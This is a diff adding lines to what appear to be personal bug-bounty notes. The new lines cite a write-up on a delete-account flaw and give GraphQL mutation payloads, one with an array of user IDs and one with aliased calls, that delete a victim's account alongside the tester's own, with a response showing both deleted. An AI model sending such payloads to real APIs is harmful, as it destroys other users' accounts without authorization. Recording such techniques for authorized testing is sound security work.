@@ -141,3 +141,12 @@ then share owner with read only
 what if the two roles seperately to same user id.
 
 @@@@@@@@@@@@@
+https://medium.com/@t4nv1/how-a-delete-account-button-became-a-12-500-nuke-for-an-entire-user-database-aaa2ea50a339
+"query": "mutation { deleteUserAccount(user_id: [\"usr_8921a\", \"usr_9955b\"]) { status, message } }"
+
+then create like below
+"query": "mutation {
+    my_account: deleteUserAccount(user_id: \"usr_8921a\") { status }
+    victim_account: deleteUserAccount(user_id: \"usr_9955b\") { status }
+  }"
+response my_account: deleted, victim_ac: deleted
